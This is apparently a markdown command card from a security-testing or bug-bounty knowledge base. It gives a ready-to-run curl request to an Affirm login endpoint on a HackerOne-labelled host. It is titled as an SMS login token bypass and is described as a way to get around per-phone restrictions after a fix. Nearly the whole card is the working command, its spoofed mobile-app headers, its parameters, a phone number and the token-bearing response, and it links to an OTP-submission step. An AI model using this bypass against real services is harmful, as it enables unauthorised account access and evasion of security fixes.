---
data: >-
  curl -X POST https://hackerone.affirm-odin.com/api/v3/login/phone/ -H
  "Content-Type: application/json; charset=UTF-8" -H "User-Agent: okhttp/3.13.1"
  -H "Affirm-User-Agent: Affirm-Android" -d
  '{"channel":"sms","address":"7022170092"}'
tags:
  - bypass
  - login
type: command
output: HTTP 200 with new response_url containing token
executor: curl
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:47.305Z'
id: c66b60b1-06be-4fcd-94da-7a413db45871
verified: false
validated: true
submitted: true
---
# Initiate SMS Login Token Bypass

## Command

```bash
curl -X POST https://hackerone.affirm-odin.com/api/v3/login/phone/ \
  -H "Content-Type: application/json; charset=UTF-8" \
  -H "User-Agent: okhttp/3.13.1" \
  -H "Affirm-User-Agent: Affirm-Android" \
  -d '{"channel":"sms","address":"7022170092"}'
```

## Description

Generates a new login token using a different phone number to bypass any per-phone restrictions after an initial fix.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| address | New target phone number | Yes |
| channel | "sms" | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://hackerone.affirm-odin.com/api/v3/login/phone/ -H "Content-Type: application/json" -d '{"channel":"sms","address":"7022170092"}'
```

## Expected Output

HTTP 200 with JSON {"response_url": "/api/v3/login/phone/{long_token}"}.

## Related

- [[commands/submit-otp-with-headers]]
